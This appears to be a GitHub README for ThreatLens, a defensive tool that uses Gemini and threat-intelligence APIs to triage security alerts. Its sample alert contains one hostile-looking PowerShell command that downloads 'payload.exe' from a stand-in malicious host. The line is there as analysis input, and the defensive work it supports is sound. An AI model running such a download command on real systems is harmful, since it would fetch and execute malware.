# 🛡️ ThreatLens - AI-Powered Threat Intelligence Analyzer

**ThreatLens** is an intelligent, automated threat intelligence platform that transforms security alert analysis from a 30-minute manual process into a 2-minute automated workflow using AI and multiple threat intelligence sources.

## 🎯 What It Does

Paste any security alert and get:
- ✅ **Automatic IOC extraction** (IPs, domains, hashes, CVEs)
- ✅ **AI-powered threat analysis** using Google Gemini
- ✅ **Multi-source threat intelligence** (VirusTotal, AbuseIPDB, URLhaus)
- ✅ **MITRE ATT&CK mapping** for attack techniques
- ✅ **Risk scoring** with confidence levels
- ✅ **Auto-generated firewall rules** for immediate blocking
- ✅ **Executive summaries** and technical reports

## 🚀 Key Features

### Intelligent Analysis
- **Gemini AI Integration** - Context-aware threat correlation and analysis
- **Pattern Recognition** - Identifies attack vectors and threat actors
- **Smart Recommendations** - Actionable security response steps

### Multi-Source Intelligence
- **VirusTotal** - Malware and URL reputation checks
- **AbuseIPDB** - IP abuse reports and confidence scores
- **URLhaus** - Malicious URL distribution tracking
- **NVD** - CVE vulnerability information

### Professional Reports
- **Executive Summary** - Management-ready briefings
- **Technical Details** - In-depth analysis for security teams
- **MITRE ATT&CK** - Mapped tactics and techniques
- **Firewall Rules** - Platform-specific blocking commands

## 📊 Time Savings

| Task | Manual | With ThreatLens |
|------|--------|----------------|
| Alert Triage | 30-45 min | 2 min |
| IOC Lookup | 15-20 min | Automated |
| Report Writing | 10-15 min | Automated |
| **Total** | **~60 min** | **~2 min** |

**Productivity Gain:** 97% faster analysis

## 🛠️ Technology Stack

**Backend:**
- Python 3.8+
- Flask (REST API)
- Google Gemini AI
- Multiple Threat Intel APIs

**Frontend:**
- Modern HTML5/CSS3/JavaScript
- Responsive design
- Real-time progress tracking

**Deployment:**
- Render.com (Cloud hosting)
- Environment-based configuration
- Production-ready

## 📦 Installation

### Prerequisites
- Python 3.8 or higher
- Git
- API keys (Gemini, VirusTotal, AbuseIPDB)

### Quick Start

```bash
# Clone the repository
git clone https://github.com/sanjeeth-solleti/AutoThreatIntel.git
cd AutoThreatIntel/backend

# Install dependencies
pip install -r requirements.txt

# Configure environment
cp .env.example .env
# Edit .env and add your API keys

# Run the application
python app.py
```

Access at: `http://localhost:5000`

### Get API Keys

1. **Gemini AI** (Required) - [Get Free Key](https://aistudio.google.com/apikey)
2. **VirusTotal** (Recommended) - [Get Free Key](https://www.virustotal.com/gui/my-apikey)
3. **AbuseIPDB** (Recommended) - [Get Free Key](https://www.abuseipdb.com/account/api)
4. **Shodan** (Optional) - [Get Key](https://account.shodan.io/)

## 🔧 Configuration

Edit `backend/.env`:

```env
GEMINI_API_KEY=your-gemini-api-key
VIRUSTOTAL_API_KEY=your-virustotal-key
ABUSEIPDB_API_KEY=your-abuseipdb-key
SHODAN_API_KEY=your-shodan-key  # Optional
```

## 💻 Usage

### 1. Start the Application
```bash
cd backend
python app.py
```

### 2. Open in Browser
Navigate to `http://localhost:5000`

### 3. Analyze Threats
- Paste any security alert (firewall logs, IDS alerts, threat notifications)
- Click "Analyze Threat"
- Get comprehensive intelligence report in ~30 seconds

### Example Alert
```
Jan 29 14:23:45 firewall blocked connection from 10.0.0.15 to 185.220.101.50:443
Process: powershell.exe
Command: Invoke-WebRequest http://malicious-site.com/payload.exe
File hash: 44d88612fea8a8f36de82e1278abb02f
CVE-2024-1234 exploitation detected
```

## 📈 Sample Output

```json
{
  "threat_level": "HIGH",
  "risk_score": 85,
  "threat_type": "Ransomware Campaign",
  "confidence": 0.92,
  "iocs_found": {
    "ips": 2,
    "domains": 1,
    "hashes": 1,
    "cves": 1
  },
  "mitre_attack": ["T1566", "T1059", "T1071"],
  "immediate_actions": [
    "Block IP 185.220.101.50 immediately",
    "Isolate affected systems",
    "Scan network for file hash"
  ]
}
```

## 🏗️ Architecture

```
┌─────────────────┐
│   Frontend UI   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Flask API     │
└────────┬────────┘
         │
    ┌────┴────┐
    ▼         ▼
┌──────┐  ┌────────────┐
│Gemini│  │Threat Intel│
│  AI  │  │    APIs    │
└──────┘  └────────────┘
```

## 📁 Project Structure

```
AutoThreatIntel/
│
├── backend/
│   ├── services/
│   │   ├── gemini_service.py
│   │   ├── ioc_extractor.py
│   │   ├── threat_intel.py
│   │   └── report_generator.py
│   │
│   ├── utils/
│   │   ├── parsers.py
│   │   └── validators.py
│   │
│   ├── app.py                  # Flask API only
│   ├── config.py
│   └── requirements.txt
│
├── frontend/
│   ├── package.json
│   │
│   ├── public/
│   │   └── index.html
│   │
│   └── src/
│       └── index.js             # React entry file
│
├── docs/
└── README.md

```

## 🌐 Deployment

### Deploy to Render

1. **Fork this repository**

2. **Create new Web Service** on [Render](https://render.com)

3. **Configure:**
   - Build Command: `pip install -r requirements.txt`
   - Start Command: `cd backend && python app.py`

4. **Add Environment Variables:**
   - `GEMINI_API_KEY`
   - `VIRUSTOTAL_API_KEY`
   - `ABUSEIPDB_API_KEY`

5. **Deploy!**

The Frontend is deployed in vercel and baackend is deployed in render for better working.

## 🎓 Use Cases

- **SOC Analysts** - Rapid alert triage and investigation
- **Incident Response** - Quick threat assessment during incidents
- **Security Teams** - Standardized threat analysis workflow
- **Researchers** - Automated threat intelligence gathering
- **Training** - Learn threat analysis techniques

## 🔒 Security Features

- ✅ Input validation and sanitization
- ✅ API rate limiting
- ✅ CORS protection
- ✅ Environment-based secrets
- ✅ No sensitive data logging

## 📊 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Frontend UI |
| `/status` | GET | System status |
| `/api/health` | GET | Health check |
| `/api/analyze` | POST | Analyze alert |

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📝 Future Enhancements

- [ ] User authentication and multi-tenancy
- [ ] Alert history and trend analysis
- [ ] PDF report export
- [ ] Team collaboration features
- [ ] Custom threat feed integration
- [ ] SIEM platform integration
- [ ] Mobile app

## 🐛 Troubleshooting

**Common Issues:**

1. **"API key not valid"**
   - Verify your API keys in `.env` file
   - Ensure keys are from the correct sources

2. **"Module not found"**
   - Run: `pip install -r requirements.txt`

3. **Port 5000 in use**
   - Change port in `app.py` or kill process using port 5000

4. **CORS errors**
   - Check CORS configuration in `app.py`
   - Verify frontend is accessing correct backend URL


## 👨‍💻 Author

**Sanjeeth Solleti**
- GitHub: [@sanjeeth-solleti](https://github.com/sanjeeth-solleti)
- Project: [ThreatLens](https://github.com/sanjeeth-solleti/AutoThreatIntel)

## 🙏 Acknowledgments

- Google Gemini AI for intelligent analysis
- VirusTotal for malware intelligence
- AbuseIPDB for IP reputation data
- URLhaus for URL threat intelligence
- Open source community
---

**⭐ Star this repo if you find it useful!**

Built with ❤️ for security professionals worldwide.
